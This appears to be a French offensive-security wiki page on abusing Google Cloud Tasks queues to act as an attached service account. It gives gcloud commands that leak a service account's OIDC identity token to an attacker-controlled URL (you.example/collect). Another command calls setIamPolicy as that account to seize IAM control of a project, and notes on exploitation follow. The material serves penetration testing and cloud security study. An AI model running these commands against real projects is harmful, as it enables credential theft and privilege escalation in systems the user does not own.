---
title: "Cloud Tasks : mettre en file d'attente des requêtes qui s'exécutent en tant que compte de service"
order: 2
description: "Abuser des files d'attente Cloud Tasks pour mettre en file d'attente des requêtes qui appellent des points de terminaison ou des API en tant que compte de service choisi."
keywords:
  - Cloud Tasks
  - file d'attente
  - tâche
  - compte de service
  - OIDC
---

# Cloud Tasks

Cloud Tasks distribue des requêtes HTTP mises en file d'attente, et une tâche peut attacher un compte de service pour que la requête porte le **jeton OIDC ou OAuth** de ce compte. Avec `cloudtasks.tasks.create` sur une file d'attente, vous mettez en file d'attente une requête vers une API Google ou votre propre point de terminaison qui s'authentifie en tant que compte attaché, atteignant le même résultat que le chemin Cloud Scheduler.

## Mettre en file d'attente une tâche qui agit en tant que compte de service

```bash
gcloud tasks queues list --location us-central1

# OIDC: leak the SA identity token to your endpoint
gcloud tasks create-http-task --queue <q> --location us-central1 \
  --url https://you.example/collect \
  --oidc-service-account-email <sa>@<proj>.iam.gserviceaccount.com

# OAuth: call a Google API as the SA
gcloud tasks create-http-task --queue <q> --location us-central1 \
  --url https://cloudresourcemanager.googleapis.com/v1/projects/<proj>:setIamPolicy \
  --method POST --body-content '{...}' \
  --oauth-service-account-email <sa>@<proj>.iam.gserviceaccount.com
```

## Notes d'exploitation

- La variante OAuth appelle les API Google en tant que compte de service, de sorte que la file d'attente agit en votre nom sans que vous déteniez le jeton.
- Lire les tâches d'une file d'attente existante peut exposer les corps de requêtes et les URL cibles de travaux légitimes.
- Comme pour Scheduler, un compte de service attaché plus `actAs` est le point de passage ; la cible du jeton fait le reste.

## Outils

- **gcloud** (`tasks create-http-task`).

## Références

- [HackTricks Cloud : GCP Cloud Tasks](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Hacking the Cloud : GCP](https://hackingthe.cloud/)
- [Google : authentification Cloud Tasks](https://cloud.google.com/tasks/docs/creating-http-target-tasks)
